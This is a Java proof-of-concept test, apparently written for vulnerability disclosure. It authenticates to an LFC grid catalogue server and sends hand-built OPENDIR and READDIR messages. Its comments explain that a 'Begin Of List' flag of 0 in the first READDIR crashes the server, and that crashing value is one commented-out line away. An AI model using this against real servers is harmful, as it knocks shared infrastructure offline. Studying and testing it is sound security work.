package test; 

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.URI;

import org.globus.common.CoGProperties;
import org.globus.gsi.CertUtil;
import org.globus.gsi.GSIConstants;
import org.globus.gsi.GlobusCredential;
import org.globus.gsi.gssapi.GSSConstants;
import org.globus.gsi.gssapi.GlobusGSSCredentialImpl;
import org.globus.gsi.gssapi.GlobusGSSManagerImpl;
import org.gridforum.jgss.ExtendedGSSContext;
import org.ietf.jgss.GSSCredential;
import org.ietf.jgss.GSSManager;

/**
 * =========================================================================== 
 * Example READDIR BOL is 0 vulnerability 
 * ===========================================================================
 * This example connects to an LFC server, does authentication and then 
 * starts an OPENDIR+READDIR request. 
 * If the first READDIR message sends contains a "Begin Of List" flag 
 * equal to '0' instead of the expected '1', the LFC server will crash.  
 * <p> 
 * Code is based on refactored code from the g-Eclipse project.
 * 
 * @author Piter T. de Boer (ptdeboer@uva.nl) (Original code: Mateusz Pabis - g-Eclipse project)  
 *
 */
public class TestBOL0
{
    // Copied from CnsConstants 
    public static final int CNS_MAGIC2      = 0x030e1302;
    public static final int CNS_LISTREPLICA = 45;
    public static final int CSEC_TOKEN_MAGIC_1  = 0xCA03;
    public static final int CNS_OPENDIR     = 10;
    public static final int CNS_READDIR     = 11;
    
     // Token for authentication handshake initialisation
    private static final byte[] nullToken = { (byte) 0x00, (byte) 0x00,
            (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00,
            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x01,
            (byte) 0x47, (byte) 0x53, (byte) 0x49, (byte) 0x00, (byte) 0x00,
            (byte) 0x00, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x00,
            (byte) 0x00, (byte) 0x02, (byte) 0x00, (byte) 0x00, (byte) 0x00,
            (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x01 };

    static String host="";
    static int port=5010; 
    static String filePath = "/grid";
    static int fileid=3; 
    
    
    
    public static void main(String args[])
    {
        if (args.length<=2) 
        {
           System.err.println("usage: <HOSTNAME> <path> <fileid> "); 
           System.exit(1); 
        }

        host=args[0]; 
        filePath=args[1]; 
        fileid=Integer.parseInt(args[2]); 

        try
        {
            new TestBOL0().doREADDIRBOL0();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        } 
    }
    
    // === >>> Test <<< === //
    
    private Socket socket;
    private DataInputStream input;
    private DataOutputStream output;
    
    public void doREADDIRBOL0() throws Exception 
    {
       connect(host,port); 
        
        // do 
        {
            // OPEN DIR 
            output.writeInt(CNS_MAGIC2); 
            output.writeInt(CNS_OPENDIR); 
            output.writeInt(30+filePath.getBytes().length); 
            
            output.writeInt(0); //uid
            output.writeInt(0); //guid 
            output.writeLong(0); //cwd
                    
            // write strings includes null terminating character
            byte bytes[]=filePath.getBytes(); 
            output.write(bytes,0,bytes.length); 
            output.writeByte(0x00);
            // no guid
            output.writeByte(0x00); 
            
            // Do not parse result, just continue: 
            
            //READDIR: 
            // READDIR header: 
            output.writeInt(CNS_MAGIC2); 
            output.writeInt(CNS_READDIR); 
            output.writeInt(34); // message size 
   
            output.writeInt(0); // uid 
            output.writeInt(0); // gid
            
            output.writeShort( 1 );     // ls -l
            output.writeShort( 50 );    // max 50 ???
            output.writeLong( fileid );
            
            /* =============================================================
             * BEGIN Send: Begin Of List: BOL
             * ============================================================= 
             * A new message must have '1' in the header, but 
             * if the first message send contains a '0' the LFC server 
             * will crash. 
             * 
             * =============================================================
             */
            
            // Begin Of Directory (BOD not BOL). 
            output.writeShort( 1); 
            //output.writeShort( 0); 
            
            /* =============================================================
             * END Send: Begin Of List: BOL
             * ============================================================= 
             */
            
            output.flush();
            
            Thread.sleep(100); 
            System.out.println(">>> Receiving <<<");

            int index=0; 
            //CnsMessage rec=new CnsMessage();
            
            // Eat message reply: 
            while (true)
            {
                int head=input.readInt(); 
                int type=input.readInt(); 
                int esize=input.readInt();// error or size 


                System.out.println("head="+head);
                System.out.println("type="+type);
                System.out.println("error/size="+esize);
               
                if (type==0x03)
                {
                    System.out.println(">>> RC:break!");
                    break; 
                }
                
                if (type==0x04)
                {
                    System.out.println(">>> IRC:break"); 
                    continue;
                }
                // eat body 
                for (int i=0;i<esize;i++)
                {
                    if ((i%16)==0)
                        System.out.print("\n"+String.format("%4x-%4x: ",i,i+16)); 
                    int b = input.readByte();
                    System.out.print(String.format("%2x ",(b&0x00ff),b)); 
                }
                
                System.out.println(); 
                
            }
        }
        
        System.out.println(">>> ALL OK <<<"); 
        
        // cleanup 
        try {input.close();}  catch (Exception e) {}; 
        try {output.close();}  catch (Exception e) {}; 
        try {socket.close();}  catch (Exception e) {}; 
        
    }
    
    public void connect(String host,int port) throws Exception
    {
        if (port<=0) 
            port=5010; 
            
        this.socket = new Socket(host,port); 
        
        CertUtil.init();

        GlobusCredential cred;
        cred = GlobusCredential.getDefaultCredential();
    
        this.input = new DataInputStream(new BufferedInputStream(
                this.socket.getInputStream()));
        this.output = new DataOutputStream(new BufferedOutputStream(
                    this.socket.getOutputStream()));

        GSSCredential gssCred = new GlobusGSSCredentialImpl(cred,
                    GSSCredential.INITIATE_AND_ACCEPT);
        new GSSTokenSend(nullToken).send(this.output);

        GSSTokenRecv returnToken = new GSSTokenRecv();
        returnToken.readFrom(this.input);
        
        GSSManager manager = new GlobusGSSManagerImpl();
        ExtendedGSSContext context = (ExtendedGSSContext) manager.createContext(
                null,
                GSSConstants.MECH_OID, 
                gssCred, 
                86400);

        context.requestMutualAuth(true); // true
        context.requestCredDeleg(false);
        context.requestConf(false); // true
        context.requestAnonymity(false);
        
        context.setOption(
        		GSSConstants.GSS_MODE,
        		GSIConstants.MODE_GSI);
    	context.setOption(
                        GSSConstants.REJECT_LIMITED_PROXY,
                        Boolean.FALSE);

    	byte[] inToken = new byte[0];

    	// Loop while there still is a token to be processed
    	while (!context.isEstablished())
    	{
                    byte[] outToken = context.initSecContext(inToken, 0,
                            inToken.length);
                    // send the output token if generated
                    if (outToken != null)
                    {
                        new GSSTokenSend(CSEC_TOKEN_MAGIC_1, 3,
                                outToken).send(this.output);

                        // gssTokenSend(this.output, );
                        this.output.flush();
                    }
                    if (!context.isEstablished())
                    {
                        GSSTokenRecv gsstoken = new GSSTokenRecv();
                        gsstoken.readFrom(this.input);

                        inToken = gsstoken.getToken();
                    }
        }
    }
            
    public class GSSTokenRecv  
    {
        private byte[] token;

        public byte[] getToken() 
        {
          return this.token;
        }
        public void readFrom( final DataInputStream input ) throws IOException 
        {
            int head=input.readInt(); 
            int type=input.readInt(); 
            int esize=input.readInt();
            
            if ((esize<=4) || (esize>1*1024*1024)) 
               throw new IOException("Token ERROR: Wrong size or Error:"+esize); 

            this.token = new byte[ esize ];
        
            System.out.println( "TOKEN read ..." );
            input.read( this.token, 0, this.token.length );
        }
    }
    


    /**
     *  Encapsulates sending part of GSS context negotiations
     */
    public class GSSTokenSend 
    {
      private int magic = CSEC_TOKEN_MAGIC_1;
      private int type = 0x1;
      private byte[] token;
      
      
      
      /**
       * Creates new GSS Token wrapper for LFC handshake
       * @param token wrapped token
       */
      public GSSTokenSend( final byte[] token ) {
       this.token = token;
      }
      
      /**
       * Creates new GSS Token wrapper for LFC handshake
       * @param magic overwrite Magic Number 
       * @param type overwrite Message Type
       * @param token wrapped token
       */
      public GSSTokenSend( final int magic, final int type, final byte[] token ) {
       this.magic = magic;
       this.type = type;
       this.token = token;
      }

      /**
       * Send GSS Token to the output stream
       * @param output stream where token will be written to
       * @throws IOException in case of any I/O problem
       */
      public void send( final DataOutputStream output ) throws IOException 
      {
          output.writeInt(magic);
          output.writeInt(type); 
          output.writeInt(token.length); 
          output.write( this.token, 0, this.token.length );
          output.flush();
      }
    }

    
}
